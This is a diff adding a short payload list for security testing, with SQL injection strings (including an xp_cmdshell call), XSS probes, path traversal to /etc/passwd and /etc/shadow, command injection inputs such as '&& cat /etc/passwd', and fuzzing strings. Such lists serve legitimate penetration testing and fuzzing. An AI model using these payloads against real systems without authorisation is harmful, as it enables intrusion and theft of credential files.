@@ -1,0 +1,29 @@
+# SQL Injection Payloads
+' OR 1=1 --
+' UNION SELECT null, version() --
+admin'--
+1; EXEC xp_cmdshell('ping 127.0.0.1') --
+
+# Cross-Site Scripting (XSS) Payloads
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+"><svg onload=alert(document.domain)>
+javascript:alert('XSS')
+
+# Path Traversal Payloads
+../../../../etc/passwd
+..\..\..\..\Windows\System32\drivers\etc\hosts
+/etc/shadow
+C:\boot.ini
+
+# Command Injection Payloads
+; ls -la
+| id
+&& cat /etc/passwd
+`uname -a`
+
+# Basic Fuzzing Strings
+../../../
+<>"'`
+${LS_COLORS}
+$()
